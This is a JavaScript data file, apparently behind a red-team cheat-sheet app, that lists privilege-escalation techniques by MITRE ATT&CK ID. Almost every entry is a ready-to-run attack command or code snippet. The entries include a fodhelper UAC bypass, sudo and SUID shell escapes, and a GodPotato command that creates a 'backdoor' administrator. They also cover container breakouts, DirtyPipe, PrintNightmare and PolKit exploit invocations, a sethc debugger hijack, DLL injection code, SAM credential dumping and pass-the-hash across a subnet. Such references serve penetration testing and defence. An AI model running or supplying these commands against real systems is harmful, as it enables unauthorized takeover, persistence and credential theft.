export const privescTechniques = [
  {
    id: "T1548",
    name: "Abuse Elevation Control Mechanism",
    summary: "UAC bypass • sudo abuse • SUID binaries",
    description: "Bypassing privilege escalation controls such as Windows UAC, Linux sudo, or SUID/SGID binaries to gain elevated privileges.",
    tags: ["T1548", "UAC bypass", "sudo", "SUID", "SGID"],
    steps: [
      { type: "comment", content: "# T1548.002 - UAC bypass via fodhelper" },
      { type: "code", content: "New-Item -Path HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command -Force\nSet-ItemProperty -Path HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command -Name '(default)' -Value 'cmd /c start powershell'\nSet-ItemProperty -Path HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command -Name 'DelegateExecute' -Value ''\nStart-Process fodhelper.exe" },
      { type: "comment", content: "# T1548.004 - Linux SUID binary abuse" },
      { type: "cmd", content: "find / -perm -4000 -type f 2>/dev/null  # Find SUID binaries\nbash -p  # If bash is SUID\n# gtfobins.github.io for SUID abuse techniques" },
      { type: "comment", content: "# T1548.003 - sudo abuse for privilege escalation" },
      { type: "cmd", content: "sudo -l  # List allowed sudo commands\nsudo vim -c ':!/bin/bash'  # Escape to shell via vim\nsudo python3 -c 'import os; os.system(\"/bin/bash\")'  # Python sudo escape" },
    ]
  },
  {
    id: "T1134",
    name: "Access Token Manipulation",
    summary: "token impersonation • Juicy Potato • RunAs",
    description: "Manipulating Windows access tokens to run processes as other users or escalate privileges through impersonation.",
    tags: ["T1134", "token impersonation", "Juicy Potato", "SeImpersonatePrivilege"],
    steps: [
      { type: "comment", content: "# T1134.002 - Token impersonation with Incognito / Meterpreter" },
      { type: "cmd", content: "meterpreter > use incognito\nmeterpreter > list_tokens -u\nmeterpreter > impersonate_token 'DOMAIN\\Administrator'" },
      { type: "comment", content: "# T1134 - Check for SeImpersonatePrivilege (Potato attacks)" },
      { type: "cmd", content: "whoami /priv  # Check for SeImpersonatePrivilege" },
      { type: "comment", content: "# Exploit SeImpersonatePrivilege with GodPotato" },
      { type: "cmd", content: "GodPotato.exe -cmd \"cmd /c net user backdoor P@ssw0rd! /add && net localgroup administrators backdoor /add\"" },
    ]
  },
  {
    id: "T1611",
    name: "Escape to Host",
    summary: "container breakout • privileged containers • cgroups",
    description: "Escaping container environments to access the underlying host system through misconfigurations or kernel exploits.",
    tags: ["T1611", "container escape", "Docker breakout", "privileged container"],
    steps: [
      { type: "comment", content: "# Escape privileged container via nsenter" },
      { type: "cmd", content: "nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash\n# Access host filesystem via /proc/1/root/" },
      { type: "comment", content: "# Docker socket mount escape" },
      { type: "cmd", content: "docker run -v /var/run/docker.sock:/var/run/docker.sock -it alpine sh\ndocker run -v /:/mnt --rm -it alpine chroot /mnt sh" },
      { type: "comment", content: "# Kubernetes - escape via hostPath volume" },
      { type: "cmd", content: "# After gaining access to privileged pod:\nchroot /host bash\n# Full host access achieved" },
    ]
  },
  {
    id: "T1068",
    name: "Exploitation for Privilege Escalation",
    summary: "kernel exploits • DirtyPipe • PrintNightmare • PolKit",
    description: "Exploiting software vulnerabilities in operating systems or applications to gain elevated privileges.",
    tags: ["T1068", "kernel exploit", "DirtyPipe", "PrintNightmare", "CVE"],
    steps: [
      { type: "comment", content: "# Identify kernel version for potential exploits" },
      { type: "cmd", content: "uname -a && cat /etc/os-release  # Linux\nsysteminfo  # Windows" },
      { type: "comment", content: "# CVE-2022-0847 DirtyPipe (Linux kernel < 5.17)" },
      { type: "cmd", content: "gcc dirtypipe.c -o dirtypipe && ./dirtypipe /etc/passwd\n# Overwrites read-only files as non-root user" },
      { type: "comment", content: "# CVE-2021-34527 PrintNightmare (Windows)" },
      { type: "cmd", content: "python3 CVE-2021-34527.py '\\\\target\\share\\malicious.dll' 'domain/user:pass'@target.com" },
      { type: "comment", content: "# CVE-2021-4034 PolKit pkexec (Linux)" },
      { type: "cmd", content: "gcc polkit_exploit.c -o polkit_exploit && ./polkit_exploit  # Root shell on unpatched systems" },
      { type: "comment", content: "# Windows local privilege escalation enumeration" },
      { type: "cmd", content: "winPEAS.exe > winpeas_output.txt  # Comprehensive Windows priv esc enumeration" },
      { type: "cmd", content: "python3 linpeas.sh | tee linpeas_output.txt  # Linux version" },
    ]
  },
  {
    id: "T1546",
    name: "Event Triggered Execution (PrivEsc)",
    summary: "AppInit_DLLs • image file execution • screensaver",
    description: "Using event-triggered execution mechanisms that run with higher privileges than the attacker currently has.",
    tags: ["T1546", "AppInit_DLLs", "IFEO", "screensaver"],
    steps: [
      { type: "comment", content: "# T1546.010 - AppInit DLL for SYSTEM-level DLL injection" },
      { type: "cmd", content: "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\" /v AppInit_DLLs /t REG_SZ /d \"C:\\Users\\Public\\malicious.dll\"\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\" /v LoadAppInit_DLLs /t REG_DWORD /d 1" },
      { type: "comment", content: "# T1546.012 - Image File Execution Options (debugger hijack)" },
      { type: "cmd", content: "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d \"cmd.exe\"\n# Press Shift x5 at login screen for SYSTEM shell" },
    ]
  },
  {
    id: "T1055",
    name: "Process Injection",
    summary: "shellcode injection • DLL injection • process hollowing",
    description: "Injecting code into the address space of running processes to evade defenses and gain elevated permissions.",
    tags: ["T1055", "process injection", "shellcode", "DLL injection", "process hollowing"],
    steps: [
      { type: "comment", content: "# T1055.001 - DLL injection into remote process" },
      { type: "code", content: "// DLL injection via WriteProcessMemory\nHANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);\nLPVOID pDllPath = VirtualAllocEx(hProc, NULL, strlen(dllPath), MEM_COMMIT, PAGE_READWRITE);\nWriteProcessMemory(hProc, pDllPath, dllPath, strlen(dllPath), NULL);\nHANDLE hThread = CreateRemoteThread(hProc, NULL, 0,\n    (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(\"kernel32.dll\"),\"LoadLibraryA\"),\n    pDllPath, 0, NULL);" },
      { type: "comment", content: "# T1055.012 - Process hollowing" },
      { type: "cmd", content: "# Use tool like RunPE or Donut to hollow a legitimate process\ndonut -i shellcode.bin -a 2 -o donut.bin -f 1  # Generate shellcode" },
      { type: "comment", content: "# Reflective DLL injection via Metasploit" },
      { type: "cmd", content: "meterpreter > migrate 644  # Migrate into target process PID" },
    ]
  },
  {
    id: "T1053.005",
    name: "Scheduled Task PrivEsc",
    summary: "writable scheduled task • PATH hijack in task",
    description: "Exploiting misconfigured scheduled tasks that run with higher privileges to achieve privilege escalation.",
    tags: ["T1053", "scheduled task", "privilege escalation", "PATH hijack"],
    steps: [
      { type: "comment", content: "# Enumerate scheduled tasks for misconfiguration" },
      { type: "cmd", content: "schtasks /query /fo LIST /v | findstr /i \"task name\\|run as\\|status\\|task to run\"\nGet-ScheduledTask | Where-Object {$_.Principal.RunLevel -eq 'Highest'} | Select TaskName,TaskPath" },
      { type: "comment", content: "# Find writable scheduled task binaries" },
      { type: "cmd", content: "accesschk.exe -accepteula -qwvu \"C:\\Program Files\\TaskBinary.exe\"\n# If writable, replace binary with malicious payload" },
    ]
  },
  {
    id: "T1078.003",
    name: "Valid Accounts - Local",
    summary: "LAPS • SAM dump • local admin reuse",
    description: "Using valid local accounts with default or weak credentials to escalate privileges.",
    tags: ["T1078", "local admin", "SAM", "LAPS"],
    steps: [
      { type: "comment", content: "# Dump local SAM database for credential extraction" },
      { type: "cmd", content: "secretsdump.py -sam SAM -system SYSTEM LOCAL\nmimikatz # lsadump::sam" },
      { type: "comment", content: "# Reuse local admin hash across machines (Pass-the-Hash)" },
      { type: "cmd", content: "nxc smb 10.0.0.0/24 -u Administrator -H NTHASH --local-auth\n# Identify machines with same local admin password" },
    ]
  },
];